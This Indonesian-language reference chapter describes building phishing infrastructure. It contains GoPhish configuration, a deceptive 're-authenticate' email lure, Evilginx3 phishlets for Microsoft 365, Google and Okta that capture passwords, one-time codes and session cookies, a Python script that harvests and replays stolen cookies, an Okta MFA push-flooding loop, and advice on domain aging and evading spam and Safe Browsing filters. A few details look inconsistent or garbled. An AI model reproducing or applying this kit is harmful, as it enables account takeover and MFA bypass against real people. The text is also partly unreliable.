# w2-phish-kit-craft — net

# Bab Referensi: Phishing Infrastructure Craft

## 1. GoPhish — Instalasi & Konfigurasi Dasar

Versi acuan: **GoPhish v0.20.1** (built against Go 1.22), **nginx 1.25.3**, **Ubuntu 22.04 LTS**.

### 1.1 Setup Server

```bash
# Prasyarat
apt update && apt install -y nginx certbot python3-certbot-nginx postfix opendkim opendkim-tools

# GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.20.1/gophish-v0.20.1-linux-64bit.zip
unzip gophish-v0.20.1-linux-64bit.zip -d /opt/gophish
chmod +x /opt/gophish/gophish
```

Konfigurasi `config.json` (fokus ke bind lokal, TLS di-terminate nginx):

```json
{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": false,
    "trusted_origins": ["phish-admin.internal.example"]
  },
  "phish_server": {
    "listen_url": "127.0.0.1:8080",
    "use_tls": false
  },
  "db_name": "sqlite3",
  "db_path": "/opt/gophish/gophish.db",
  "migrations_prefix": "db/db_",
  "logging": { "filename": "/var/log/gophish/gophish.log", "level": "info" }
}
```

nginx vhost (delivery server + landing di port yang sama, dipisah Host header / path):

```nginx
server {
    listen 443 ssl http2;
    server_name mail-relay-sec.example.com;
    ssl_certificate     /etc/letsencrypt/live/mail-relay-sec.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/mail-relay-sec.example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### 1.2 Email Template

Template dengan tracking piksel otomatis (GoPhish injeksi `{{.TrackingUrl}}`), fallback link, dan klausa MFA yang memancing klik.

```html
<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="font-family:Segoe UI,Arial,sans-serif;color:#1a1a1a;background:#f5f5f5;padding:24px">
<div style="max-width:560px;margin:auto;background:#fff;border:1px solid #e3e3e3;border-radius:6px;padding:32px">
  <img src="https://assets.example.com/logo.png" alt="IT Security" height="28">
  <h2 style="font-weight:600;font-size:20px">Firewall policy update — action required</h2>
  <p>Your account <b>{{.Email}}</b> must re-authenticate to the new perimeter gateway before
     <b>Friday 17:00 UTC</b>. Sessions not verified will be terminated.</p>
  <p style="text-align:center;margin:28px 0">
    <a href="{{.URL}}" style="background:#0b57d0;color:#fff;padding:12px 22px;border-radius:4px;text-decoration:none;font-weight:600">
      Verify &amp; Continue
    </a>
  </p>
  <p style="font-size:12px;color:#666">If the button fails, paste this link:<br>
     <span style="font-family:Consolas,monospace">{{.URL}}</span></p>
  <hr style="border:none;border-top:1px solid #eee;margin:24px 0">
  <p style="font-size:12px;color:#888">IT Security Operations · Ticket INC-{{.RId}}</p>
  <img src="{{.TrackingUrl}}" width="1" height="1" alt="">
</div>
</body></html>
```

`{{.URL}}` akan direplace dengan `/landing?rid=<rid>` bila menggunakan "Add tracking parameters" di profil; jika tidak, ini selalu menjadi URL landing. `{{.RId}}` di dengan default tidak ada — gunakan custom template var via `{{.BaseURL}}` atau template variable kustom yang disuntik di `Sending Profile` header `X-Mailer` (tidak standar; umumnya diganti dengan `{{.TrackingUrl}}` saja).

### 1.3 Sending Profile (SMTP + DKIM + SPF)

Profil "SMTP relay internal — SES/ap-southeast-1" (contoh dengan Amazon SES):

```yaml
name: "relay-sec-01"
interface_type: SMTP
host: "email-smtp.ap-southeast-1.amazonaws.com:587"
username: "AKIAEXAMPLEUSER"
password: "BM+EXAMPLE/SES/SMTP/PASSWORD"
from_address: "IT Security <it-security@mail-relay-sec.example.com>"
ignore_cert_errors: false
headers:
  - { key: "X-Mailer", value: "Microsoft Outlook 16.0" }
  - { key: "X-Priority", value: "3" }
  - { key: "Message-ID", value: "<{{.RId}}@mail-relay-sec.example.com>" }
```

**DKIM signing** — GoPhish tidak melakukan signing sendiri. Sign di MTA: Postfix + OpenDKIM, atau di SES (mudah, kelola domain identity). Untuk self-host:

```bash
# Generate key (selector: sec2024)
opendkim-genkey -b 2048 -d mail-relay-sec.example.com -s sec2024 -D /etc/opendkim/keys/
cat /etc/opendkim/keys/mail-relay-sec.example.com/sec2024.txt
# Publikasikan TXT: sec2024._domainkey.mail-relay-sec.example.com
```

```ini
# /etc/opendkim.conf (extract)
Domain                  mail-relay-sec.example.com
Selector                sec2024
KeyTable                /etc/opendkim/key.table
SigningTable            refile:/etc/opendkim/signing.table
InternalHosts           /etc/opendkim/trusted.hosts
Canonicalization        relaxed/relaxed
Mode                    sv
```

```bash
# /etc/postfix/main.cf
smtpd_milters         = inet:127.0.0.1:8891
non_smtpd_milters     = inet:127.0.0.1:8891
milter_default_action = accept
```

**DNS minimum untuk deliverability (wajib sebelum kirim):**

| Record | Nilai | TTL |
|---|---|---|
| A/AAAA `mail-relay-sec.example.com` | IP relay | 300 |
| MX `mail-relay-sec.example.com` | 10 `mail-relay-sec.example.com` | 300 |
| SPF TXT | `v=spf1 ip4:<server_ip> include:amazonses.com -all` | 300 |
| DKIM TXT `sec2024._domainkey` | `v=DKIM1; k=rsa; p=<base64>` | 300 |
| DMARC TXT `_dmarc` | `v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com; adkim=s; aspf=s` | 300 |
| PTR (rDNS) di IP | `mail-relay-sec.example.com` | — |
| TLS-RPT / MTA-STS | opsional, naikkan reputasi | — |

Domain baru tanpa history: mulai dengan 200–500 email/hari saat pemanasan, naik 2× per 48 jam. Gmail Postmaster Tools + Microsoft SNDS untuk monitor reputation. **Gagal di sini = seluruh kampanye jatuh ke spam.**

---

## 2. Evilginx3 — Anatomi Phishlet

Versi acuan: **Evilginx3 v3.3.0**, **Chrome 131** (target), **nginx 1.25** (bila diproksikan ulang), **Go 1.22** build.

Struktur phishlet (YAML) — 4 blok penting: `proxy_hosts`, `sub_filters`, `auth_tokens`, `credentials`, `login` (formal: `auth_urls` / `login` optional).

### 2.1 Phishlet — Microsoft 365 (login.microsoftonline.com)

```yaml
name: "m365"
author: "@rt-internal"
min_ver: "3.2.0"

proxy_hosts:
  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true }
  - { phish_sub: "aadcdn", orig_sub: "aadcdn", domain: "msftauth.net", session: false, is_landing: false }
  - { phish_sub: "login", orig_sub: "login", domain: "live.com", session: true, is_landing: false }

sub_filters:
  - { trg: "login.microsoftonline.com", search: "https://login.microsoftonline.com", replace: "https://{hostname}", mimes: ["text/html","application/javascript","application/json"] }
  - { trg: "aadcdn.msftauth.net",       search: "https://aadcdn.msftauth.net",       replace: "https://aadcdn.{domain}", mimes: ["text/html","application/javascript"] }
  - { trg: "login.live.com",            search: "https://login.live.com",            replace: "https://login.{domain}", mimes: ["text/html","application/javascript"] }

auth_tokens:
  - domain: ".login.microsoftonline.com"
    keys:
      - { name: "ESTSAUTHPERSISTENT", type: "cookie" }
      - { name: "ESTSAUTH",           type: "cookie" }
      - { name: "ESTSAUTHLIGHT",      type: "cookie", optional: true }
      - { name: "ESTSSC",             type: "cookie", optional: true }
  - domain: ".login.live.com"
    keys:
      - { name: "RPSSecAuth", type: "cookie" }
      - { name: "MSPAuth",    type: "cookie" }

credentials:
  username:
    key: "login"
    search: "loginfmt"
    type: "post"
  password:
    key: "passwd"
    search: "passwd"
    type: "post"
  custom:
    - key: "otc"
      search: "otc"
      type: "post"

login:
  domain: "login.microsoftonline.com"
  path: "/common/oauth2/authorize"
```

**Kenapa `session: true` + parameter URL di `Share session`?** Evilginx3 memetakan sesi phishlet ke klien lewat `sessid` internal. Parameter `?__fx=<hex>` (atau via header referrer yang di-inject) di URL landing (`https://login.example.com/?__fx=...`) **mengikat browser korban ke sesi capture yang sudah pre-allocated**. Tanpa `sessid` di URL, dua korban membuka link yang sama secara paralel dapat saling merebut cookie jar: cookie korban A (sudah MFA) bisa terkirim ke server lewat sesi korban B yang belum MFA. Untuk target dengan cookie rotasi (Microsoft ESTSAUTH: TTL ~24 jam, rotating), sesi yang di-share **harus milik satu korban**; `Share Session` di UI GoPhish **tidak sama** dengan `sessid` Evilginx dan tidak boleh diaktifkan (akan mengikat GoPhish rid ke lebih dari satu browser → cookie cross-contamination). Gunakan `?__fx=` per email per penerima (Evilginx3 mendukung `{{.RId}}` → `?__fx={{.RId}}` di URL GoPhish bila dikonfigurasi via `URL` template override).

### 2.2 Phishlet — Google (accounts.google.com)

```yaml
name: "google"
min_ver: "3.2.0"
proxy_hosts:
  - { phish_sub: "accounts", orig_sub: "accounts", domain: "google.com", session: true, is_landing: true }
  - { phish_sub: "accounts", orig_sub: "accounts", domain: "google.co.id", session: true }
  - { phish_sub: "ssl",      orig_sub: "ssl",      domain: "gstatic.com", session: false }
sub_filters:
  - { trg: "accounts.google.com", search: "https://accounts.google.com", replace: "https://{hostname}", mimes: ["text/html","application/javascript","application/json"] }
  - { trg: "ssl.gstatic.com",     search: "https://ssl.gstatic.com",     replace: "https://ssl.{domain}", mimes: ["text/html","application/javascript"] }
auth_tokens:
  - domain: ".google.com"
    keys:
      - { name: "SID",      type: "cookie" }
      - { name: "HSID",     type: "cookie" }
      - { name: "SSID",     type: "cookie" }
      - { name: "APISID",   type: "cookie" }
      - { name: "SAPISID",  type: "cookie" }
      - { name: "__Secure-1PSID", type: "cookie" }
      - { name: "__Secure-3PSID", type: "cookie" }
credentials:
  username: { key: "identifier", search: "identifier", type: "post" }
  password: { key: "password",   search: "password",   type: "post" }
login:
  domain: "accounts.google.com"
  path: "/v3/signin/identifier"
```

Google memakai `Secure` dan `HttpOnly` + `Rotate` pada `__Secure-*PSID`. Cookie ini **hanya valid** bila domain phishlet secara efektif mirip (Google bind ke `google.com` di cookie domain — Evilginx tidak dapat menulis cookie ke domain `google.com` dari host `login.example.com` tanpa trik `sub_filters` yang mengubah Set-Cookie). Praktik lapangan: untuk Google, hasil seringkali hanya **password + TOTP seed** (bukan session), sehingga MFA-capture otomatis menjadi wajib (lihat §3).

### 2.3 Phishlet — Okta (org.okta.com tenant)

```yaml
name: "okta"
min_ver: "3.2.0"
proxy_hosts:
  - { phish_sub: "org", orig_sub: "org", domain: "okta.com", session: true, is_landing: true }
sub_filters:
  - { trg: "org.okta.com", search: "https://org.okta.com", replace: "https://{hostname}", mimes: ["text/html","application/javascript","application/json"] }
auth_tokens:
  - domain: ".okta.com"
    keys:
      - { name: "sid",            type: "cookie" }
      - { name: "DT",             type: "cookie" }
      - { name: "JSESSIONID",     type: "cookie", optional: true }
credentials:
  username: { key: "identifier", search: "identifier", type: "post" }
  password: { key: "credentials.passcode", search: "credentials.passcode", type: "post" }
login:
  domain: "org.okta.com"
  path: "/login/login.htm"
```

Okta melakukan `Set-Cookie` dengan `SameSite=None; Secure` dan bind ke `org.okta.com` — sub_filter wajib mengubah cookie `Domain=org.okta.com` → `Domain=login.example.com` (inilah esensi `sub_filters` dan mengapa phishlet per-target harus dicek ulang tiap rilis). Bila versi Okta mengubah parameter field (misal `credentials.passcode` → `passcode`), `credentials` blok gagal → tidak ada capture.

### 2.4 Command Setup Evilginx3

```bash
# Build
git clone https://github.com/kgretzky/evilginx2.git /opt/evilginx3
cd /opt/evilginx3 && make release

# Jalankan
./build/evilginx -p ./phishlets -developer -p 443
# console:
config domain example.com
config ipv4 203.0.113.10
config unauth_url https://mail-relay-sec.example.com/
phishlets hostname m365 login.example.com
phishlets enable m365
lures create m365
lures edit 0 redirect_url https://www.office.com/
lures edit 0 hostname login.example.com
lures get-url 0
# → https://login.example.com/AbC123 (ritel token)
```

DNS wildcard wajib: `*.example.com → 203.0.113.10`. TLS via `letsencrypt` otomatis pada enable — **gagal** jika HTTP-01 tidak bisa reachable (port 80 tertutup di banyak cloud). Gunakan `certbot certonly --dns-*` lalu copy cert ke `~/.evilginx/crt/`.

### 2.5 Hidden Overlay Interaction

Evilginx3 menyuntikkan **overlay JS** ke responses HTML via `sub_filters` (internal, `mimes: text/html`) untuk:
- Menangkap input form sebelum submit (bypass anti-bot yang menolak POST sebenarnya).
- Menyembunyikan indikator "waiting for user" di sisi korban.
- **Wajib** dimatikan untuk phishlet target yang mendeteksi overlay (misal Okta FastPass memeriksa bahwa `event.isTrusted`).

Kontrol:

```bash
# console evilginx
phishlets disable m365_overlay       # jika phishlet turunan memakai overlay aktif
config js_inject false               # matikan global injector bila echo di console
```

Jika overlay mengembalikan `null` di `credentials` (field kosong), cek di Chrome 131 DevTools: overlay menghalangi form asli → set `phishlets enable` ulang dengan `sub_filter` yang hanya menyuntik ke `/landing` path, bukan seluruh domain.

---

## 3. Otomasi MFA-Capture

### 3.1 TOTP (authenticator app)

Setelah Evilginx menangkap password, target meminta 6-digit TOTP. Evilginx **tidak** memiliki relay realtime TOTP ke attacker; mode "MFA capture" adalah menunggu korban memasukkan TOTP di halaman asli yang diproksikan, lalu cookie sesi direplikasi.

**Alur relay otomatis** (jika target adalah M365 dengan `otc` custom credential):

```bash
# console evilginx — aktifkan relay ke Telegram (built-in via scripting)
lures create m365
lures edit 0 redirect_url "https://outlook.office.com/mail/"
# Setelah korban masuk MFA, cookie + token bisa di-export:
sessions export 0 --format netscape
```

Otomasi ekstrak sesi → kirim ke checker:

```python
# relay_totp.py — poll Evilginx sessions API (localhost:8888 default console port)
import requests, time, json, subprocess
BASE = "http://127.0.0.1:8888/api/v1"
TOKEN = "evilginx-api-token"
h = {"Authorization": f"Bearer {TOKEN}"}

seen = set()
while True:
    r = requests.get(f"{BASE}/sessions", headers=h).json()
    for s in r:
        if s["id"] in seen or not s.get("tokens"): continue
        seen.add(s["id"])
        # tulis cookies ke Netscape cookie file
        with open(f"/tmp/cookies_{s['id']}.txt","w") as f:
            for domain, cookies in s["tokens"].items():
                for c in cookies:
                    f.write(f"{domain}\tTRUE\t/\t{str(c.get('secure',True)).upper()}\t0\t"
                            f"{c['name']}\t{c['value']}\n")
        # verifikasi ke Microsoft Graph
        r2 = subprocess.run(
            ["curl","-s","-o","/dev/null","-w","%{http_code}",
             "-b",f"/tmp/cookies_{s['id']}.txt","https://graph.microsoft.com/v1.0/me"],
            capture_output=True, text=True)
        print(f"[{s['id']}] user={s['username']} graph={r2.stdout}")
    time.sleep(5)
```

`curl 200` pada Graph = sesi valid. `401` = cookie expired/rotated sebelum replay (khas Microsoft ESTSAUTH TTL ~24 jam, tapi rotasi per request dapat mematikan replay jika phishlet salah set `sub_filter` cookie).

### 3.2 MFA Push Fatigue (Number Matching, Microsoft Authenticator)

Microsoft sejak 2023 **wajib number-matching** (default) — push fatigue lama **tidak jalan** untuk new tenant. Untuk tenant lama yang masih "Approve/Deny" tanpa number, brute-force push bisa dicoba, tetapi rate-limit `AADSTS500121` muncul setelah ~10 percobaan / 10 menit per user. Praktik lapangan: **push fatigue mati untuk M365**. Yang masih hidup:

| Vendor | Mekanisme | Bypass feasible |
|---|---|---|
| M365 (new tenant) | Number match + location | Tidak — perlu **AiTM** (Evilginx) atau **device code phishing** |
| M365 (legacy, <2023 config) | Approve/Deny | Ya, via replay push loop (~6 push dalam 5 menit; user fatigue) |
| Google | TOTP / push (Gmail app) | TOTP relay; push fatigue **tidak** (Google number match) |
| Okta Verify | Push / TOTP / WebAuthn | Push fatigue via `okta-push-flood.py` — efektif pada tenant tanpa number challenge |
| Duo | Push / passcode | Push fatigue efektif; rate-limit longgar |
| Auth0 Guardian | Push / OTP | Push fatigue efektif |

Contoh push-flood ke Okta Verify (hanya untuk engagement yang eksplisit mencakup ini, di lab):

```bash
# skrip: enumerate faktor, kirim N push, log jawaban
for i in $(seq 1 8); do
  curl -s -X POST https://org.okta.com/api/v1/authn/factors/$FACTOR_ID/verify \
    -H "Content-Type: application/json" \
    -b cookiejar.txt \
    -d "{\"stateToken\":\"$STATE\"}" -o push_$i.json
  sleep 45
done
```

`push_$i.json` akan berisi `"status":"MFA_CHALLENGE"` (pending) atau `"SUCCESS"`. Rate limit Okta: `E0000068` setelah ~10 dalam 10 menit. Bila user menolak → `MFA_DENIED`, tenant **mengunci** faktor; jangan ulangi di tenant sama.

**Bypass yang benar-benar efektif untuk MFA modern = AiTM (Evilginx) + cookie replay**, bukan push fatigue.

---

## 4. Infra OPSEC

### 4.1 Domain Aging & Reputasi

| Faktor | Aksi | Waktu minimum |
|---|---|---|
| Domain age (registrar) | Registrasi 3–6 bulan antesipasi; isi WHOIS privat, MX aktif, website "korporat" kecil | 90 hari sebelum send |
| TLS cert | Let's Encrypt dari hari-1, perpanjang otomatis | 14 hari |
| SPF/DKIM/DMARC | Publikasikan + kirim transactional test (mail-tester.com 9/10+) | 7 hari sebelum kampanye |
| Warm-up | 50/hari → 100 → 200 → 400 per 48 jam dari IP yang sama | 2–3 minggu |
| PTR (rDNS) | Set di provider IP (Hetzner, DO, AWS EIP) | Hari-1 |
| Blocklist monitor | MXToolbox, Google Postmaster, SNDS | Harian |

Jangan pakai domain lookalike obvious (`micros0ft-login.com`). Klasifikasi URL rep (Google Safe Browsing, Microsoft SmartScreen) otomatis blokir dalam <24 jam. Gunakan **domain yang secara semantik masuk akal** untuk target (`mail-relay-sec.example.com`, `sso-portal.example.com`), dan **path/URL short** (`.com/AbC123`).

### 4.2 Mail Server Reputation

- **SES** ap-southeast-1/ap-northeast-1 memiliki reputasi lebih baik dari IP fresh Hetzner/OVH. Gunakan SES/SendGrid/Mailgun **dengan dedicated IP** untuk volume >50k, **shared pool** untuk <5k.
- **DMARC alignment** — `adkim=s; aspf=s` wajib bila using subdomain relay.
- **BIMI** tidak wajib, tapi VMC (Verified Mark Certificate) mencegah Gmail menandai.
- **Hindari** relay dari VPS murah untuk volume besar (Spamhaus CSS, UCEPROTECT langsung masuk). Subnet /24 yang pernah dipakai phish akan di-block permanen.
- **Test kirim** ke Gmail Postmaster Tools + [mail-tester.com](https://mail-tester.com) — target 9/10 atau 10/10 sebelum blast.

### 4.3 Deliverability Checklist per Kampanye

```yaml
pre_send:
  - domain_age_days: "> 90"
  - ptr_set: true
  - spf: "v=spf1 ip4:<ip> include:<esp> -all"
  - dkim_selector_published: true
  - dmarc: "p=quarantine; adkim=s; aspf=s"
  - tls_rpt: optional
  - blocklist_check: clean
  - warmup_volume: "matches ramp schedule"
  - mail_tester_score: ">= 9/10"
  - gmail_postmaster_reputation: "medium or high"
  - microsoft_snds: "green"
```

---

## 5. Jebakan Operasional di Lapangan

1. **`Share Session` di GoPhish salah dipakai → korban A dapat halaman yang membawa cookie korban B.** GoPhish `Share Session` mengikat **browser fingerprint + IP + rid**; bila kampanye dikirim dari satu inbox dengan `rid` yang sama ke 50 penerima, Evilginx akan menerima 50 browser dengan token sama → Evilginx **reset sesi** dan capture pertama hangus. **Jangan aktifkan Share Session di GoPhish untuk kampanye Evilginx**. Gunakan `?__fx={{.RId}}` di URL template (unique per email) agar Evilginx mengalokasikan sesi per penerima.

2. **DKIM selector salah di GoPhish (built-in tidak sign).** GoPhish tidak menandatangani email. Bila Anda mengharapkan DKIM valid dari profil SMTP SES, pastikan domain identity SES **verified** dan `Easy DKIM` aktif di SES, atau lewat Postfix+OpenDKIM. `mail-tester.com` akan menampilkan `dkim=pass` atau `dkim=none`. `none` = SES tidak signing, kampanye langsung ditandai spam di Gmail.

3. **`sessid` URL tanpa `?__fx=` saat dua korban membuka bersamaan.** Umum terjadi di tim besar saat blast >100. Solusi: batch GoPhish per 25 email dengan delay 30s, atau override `URL` di template GoPhish dengan custom `rid` → `{{.URL}}?__fx={{.RId}}` (butuh fork atau patch `templates` — default `{{.URL}}` sudah berisi `rid` tapi tidak __fx).

4. **Phishlet basi karena target update CSP / Trusted Types (Chrome 131).** Microsoft 365 memakai `Trusted Types` pada `/common/login` sejak Okt 2024. Overlay JS Evilginx3 v3.3.0 yang menyuntik `innerHTML` akan diblokir di Chrome 131 → `credentials` kosong. **Cek phishlet di Chrome 131 dev build setiap minggu**; update `min_ver` dan `js_inject` off bila perlu. Gejala: halaman asli tampil, tapi submit menghasilkan 400 dari Microsoft (parameter `passwd` hilang).

5. **Cookie `Secure`/`SameSite` yang tidak di-rewrite oleh `sub_filters`.** Bila `Set-Cookie` dari target memuat `Domain=.okta.com` dan phishlet tidak meng-rewrite ke `Domain=.login.example.com`, browser menolak menyimpan cookie → login "looping" (kembali ke halaman login). Diagnosa via DevTools Application → Cookies: tidak ada `sid` di domain phishlet. Perbaiki `sub_filters` dengan `mimes: ["*"]` (tidak ideal) atau parser cookie di phishlet `proxy_hosts` `session: true`.

6. **Push fatigue dipakai di tenant yang sudah number-matching.** M365 new tenant sejak 2023 memaksa number-matching — push flood hanya menghasilkan `MFA_DENIED` berulang dan **mengunci akun** setelah ~5 deny. Deteksi tenant: cek `https://login.microsoftonline.com/common/GetCredentialType` (butuh probe terkontrol), atau coba 1 push pertama dan lihat apakah prompt di app menampilkan angka. Bila angka → **stop**, pindah ke AiTM.

7. **Domain blocklist sebelum blast.** Domain dibeli hari-H, dipakai blast hari-H+1. Google Safe Browsing men-scan URL di email pertama dan memblokir domain dalam <24 jam → klik pertama OK, klik kedua situs sudah masuk interstisial Safe Browsing. **Jeda minimal 3 hari antara warm-up test URL dan blast**, dan **warm-up mengirim URL ke landing yang sama** (bukan URL dummy) agar reputasi URL terbentuk sebelum volume besar.

8. **`redirect_url` di GoPhish lures tidak match `redirect_url` di Evilginx.** Setelah capture, korban harus diarahkan ke **halaman asli target** (bukan halaman "phishing sukses"). Bila GoPhish redirect setelah submit, 90% korban sadar. Atur: GoPhish `redirect_url` = `https://outlook.office.com/`, Evilginx `redirect_url` = sama. Pastikan `unauth_url` juga target asli agar sesi hangus tidak menampilkan halaman phish.

9. **PTR/HELO mismatch.** Postfix default HELO `mail-relay-sec.example.com` — bila PTR di IP lain (`ip-203-0-113-10.ec2.internal`), Gmail menandai `HELO not matched PTR`. Set `myhostname = mail-relay-sec.example.com` di Postfix **dan** PTR EIP di AWS console (proses dukungan, 24–48 jam).

10. **Sesi capture 200 OK tapi 401 di replay.** Cookie Microsoft `ESTSAUTHPERSISTENT` berumur 14 hari TAPI `ESTSAUTH` rotasi per request. Jika `sub_filters` salah parse `Set-Cookie` dari response M365, cookie di Evilginx = cookie terakhir korban, tapi `ESTSAUTH` lama sudah di-revoke oleh server karena korban lanjut request setelah capture. Window replay valid ~30–90 detik dari request terakhir korban. **Otomasi replay harus berjalan <60 detik** dari sesi ditemukan; polling 5-detik (lihat §3.1) adalah batas aman.

11. **`-developer` flag Evilginx3 membocorkan log.** `-developer` mencetak `sub_filters` matches ke stdout → log server 200 MB/24 jam, dan `journalctl` menyimpan token di log. Di VPS multi-tenant dengan penyedia yang men-scrape disk, ini kebocoran. Matikan `-developer` di produksi.

12. **Let's Encrypt rate limit saat wildcard.** Wildcard `*.example.com` butuh DNS-01; jika certbot dijalankan di主机 Evilginx tanpa plugin DNS, `enable m365` akan gagal diam-diam (phishlet `enabled` tapi HTTPS tidak listen). Cek `ss -tlnp | grep 443` setelah `phishlets enable`; kalau tidak ada listener, cert belum terbit.

---

## [reasoning trace]


